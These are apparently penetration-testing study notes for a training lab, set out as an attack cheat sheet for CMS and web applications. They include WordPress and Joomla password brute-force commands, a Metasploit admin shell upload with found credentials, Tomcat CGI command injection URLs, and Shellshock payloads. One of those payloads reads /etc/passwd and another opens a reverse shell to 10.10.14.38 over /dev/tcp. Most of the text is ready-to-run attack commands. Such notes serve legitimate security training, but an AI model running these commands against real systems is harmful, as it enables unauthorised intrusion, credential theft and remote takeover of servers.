#

# CMS

## WordPress

To find plugin versions , ex : wp-sitemap-page  
`http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt`

`curl http://blog.inlanefreight.local/?p=1 | grep plugin`  
`curl http://blog.inlanefreight.local | grep plugin`

**wpscan**

The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`.  
The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through /xmlrpc.php.  
***The `xmlrpc` method is preferred as it’s faster.***

```
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

```
wpscan --url http://blog.inlanefreight.local/ --enumerate ap,at --passwords '/usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt' 
```

### Code Execution

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

## Joomla

### Enumeration

[droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.  

```
droopescan scan joomla --url http://dev.inlanefreight.local/
```

### Brute Force

[joomla-brute.py](https://github.com/ajnik/joomla-bruteforce)
```
python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Drupal

### Enumeration

```
droopescan scan drupal -u http://drupal.inlanefreight.local
```

## Attacking Tomcat CGI

### Fuzzing Extentions - .CMD

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

### Fuzzing Extentions - .BAT

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

> For Linux , try enum with extensions like .sh , py , pl , rb ...

### Enumeration - Gobuster

```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

### Exploitation 
```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

### Confirming the Vulnerability

```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

### Exploitation to Reverse Shell Access

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```


# Miscellaneous Applications

## IIS Tilde Enumeration

### Tilde Enumeration using IIS ShortName Scanner

[IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
```
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

### Generate Wordlist

```
egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```

```
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```


## Attacking Applications Connecting to Services

### ELF Executable Examination

Once the binary is loaded, we set the disassembly-flavor to define the display style of the code, and we proceed with disassembling the main function of the program.  
```
gdb-peda$ gdb ./octopus_checker
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
```
```
b *0x5555555551b0
run
```
